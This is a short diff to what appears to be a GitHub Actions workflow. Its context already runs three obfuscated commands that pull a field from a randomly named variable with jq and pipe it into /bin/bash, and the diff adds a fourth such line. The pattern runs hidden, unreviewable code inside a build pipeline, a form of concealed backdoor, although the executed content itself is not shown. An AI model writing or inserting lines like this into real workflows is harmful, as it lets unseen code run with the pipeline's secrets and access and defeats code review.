@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$xmz404" | jq -r .a3415 | /bin/bash
           printf '%s' "$spufp4" | jq -r .ib3244 | /bin/bash
           echo $byxv4915 | jq -r .z797 | /bin/bash
+          echo $swh9 | jq -r .gxfbh2 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
